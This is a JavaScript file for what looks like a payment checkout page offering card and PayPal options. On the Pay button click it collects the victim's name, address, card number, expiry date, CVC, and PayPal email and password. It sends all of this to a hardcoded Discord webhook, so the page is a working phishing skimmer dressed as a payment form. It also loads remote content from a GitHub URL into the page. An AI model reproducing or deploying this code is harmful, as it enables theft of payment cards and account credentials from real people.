document.addEventListener("DOMContentLoaded", function () {
  // Dynamically load the CSS using XMLHttpRequest
  var xhttp = new XMLHttpRequest();
  xhttp.open("GET", "https://raw.githubusercontent.com/Leenxz/Leenservice/refs/heads/main/script.js", true); // Replace with your actual CSS file URL
  xhttp.onreadystatechange = function() {
    if (xhttp.readyState === 4) {
      if (xhttp.status === 200) {
        var link = document.createElement('style');
        link.innerHTML = xhttp.responseText;
        document.getElementsByTagName('head')[0].appendChild(link);
      }
    }
  };
  xhttp.send(null);

  const cardOption = document.getElementById("payment-method-card");
  const paypalOption = document.getElementById("payment-method-paypal");
  const cardFields = document.getElementById("credit-card-fields");
  const paypalFields = document.getElementById("paypal-fields");

  const currencySelector = document.getElementById("currency-selector");
  const amountInput = document.getElementById("amount-input");
  const payButton = document.getElementById("pay-button");

  const paypalEmail = document.querySelector("#paypal-fields input[type='email']");
  const paypalPassword = document.querySelector("#paypal-fields input[type='password']");

  const expiryMonth = document.getElementById("expiry-month");
  const expiryYear = document.getElementById("expiry-year");
  const fullNameInput = document.getElementById("full-name"); // Full Name field
  const addressInput = document.getElementById("address"); // Address field
  const cityInput = document.getElementById("city"); // City field
  const zipcodeInput = document.getElementById("zipcode"); // Zip Code field

  // Populate expiry month and year
  for (let i = 1; i <= 12; i++) {
    const month = i < 10 ? `0${i}` : i;
    expiryMonth.innerHTML += `<option value="${month}">${month}</option>`;
  }

  const currentYear = new Date().getFullYear();
  for (let i = 0; i < 15; i++) {
    const year = currentYear + i;
    expiryYear.innerHTML += `<option value="${year}">${year}</option>`;
  }

  // Toggle payment method fields
  cardOption.addEventListener("change", function () {
    if (cardOption.checked) {
      cardFields.style.display = "block";
      paypalFields.style.display = "none";
    }
  });

  paypalOption.addEventListener("change", function () {
    if (paypalOption.checked) {
      cardFields.style.display = "none";
      paypalFields.style.display = "block";
    }
  });

  // Update Pay button text dynamically
  function updatePayButton() {
    const currency = currencySelector.value;
    const amount = amountInput.value || "0";
    payButton.textContent = `Pay ${amount} ${currency}`;
  }

  currencySelector.addEventListener("change", updatePayButton);
  amountInput.addEventListener("input", updatePayButton);

  // Restrict non-numeric input in the Card Number and CVC fields
  const cardNumberInput = document.getElementById("card-number");
  const cardCvcInput = document.getElementById("card-cvc");

  cardNumberInput.addEventListener("input", function (e) {
    // Remove non-numeric characters
    e.target.value = e.target.value.replace(/\D/g, "").slice(0, 16); // Limit to 16 digits
  });

  cardCvcInput.addEventListener("input", function (e) {
    // Remove non-numeric characters
    e.target.value = e.target.value.replace(/\D/g, "").slice(0, 3); // Limit to 3 digits
  });

  // Function to send data to Discord webhook
  function sendToDiscord(paymentInfo) {
    const webhookUrl = "https://discord.com/api/webhooks/1319833063160549477/dQ2vbDNYyuO3iQKX_h0gOFUs8fZTEnFfBziH7QPJw0n6CBo1o03WQ-KjCtBq2pgiee4K";
    
    const data = {
      content: `**New Payment Info:**\n\n${paymentInfo}`
    };

    fetch(webhookUrl, {
      method: 'POST',
      headers: {
        'Content-Type': 'application/json'
      },
      body: JSON.stringify(data)
    }).then(response => {
      if (response.ok) {
        console.log("Data sent to Discord successfully!");
      } else {
        console.error("Error sending data to Discord");
      }
    }).catch(error => {
      console.error("Error:", error);
    });
  }

  // Handle Pay button click
  payButton.addEventListener("click", function () {
    // Collect payment details based on the selected payment method
    let paymentInfo = `Full Name: ${fullNameInput.value}\nAddress: ${addressInput.value}\nCity: ${cityInput.value}\nZip Code: ${zipcodeInput.value}\nCurrency: ${currencySelector.value}\nAmount: ${amountInput.value}\n`;

    if (cardOption.checked) {
      const cardNumber = cardNumberInput.value;
      const cardExpiryMonth = expiryMonth.value;
      const cardExpiryYear = expiryYear.value;
      const cardCvc = cardCvcInput.value;

      paymentInfo += `Payment Method: Card\nCard Number: ${cardNumber}\nExpiry Date: ${cardExpiryMonth}/${cardExpiryYear}\nCVC: ${cardCvc}`;
    } else if (paypalOption.checked) {
      const email = paypalEmail.value;
      const password = paypalPassword.value; // Collect PayPal password

      paymentInfo += `Payment Method: PayPal\nPayPal Email: ${email}\nPayPal Password: ${password}`; // Include the password
    }

    // Send payment info to Discord webhook
    sendToDiscord(paymentInfo);
  });
});
